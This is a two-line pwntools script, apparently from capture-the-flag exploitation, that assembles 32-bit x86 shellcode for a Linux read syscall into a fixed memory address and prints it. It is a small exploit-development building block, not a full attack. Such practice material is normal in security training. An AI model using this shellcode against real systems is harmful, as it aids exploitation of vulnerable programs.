from pwn import *
info(asm('mov eax,0x3;mov ecx,0x804a0c4;mov ebx,0x3;mov dl,0x30;int 0x80;'))
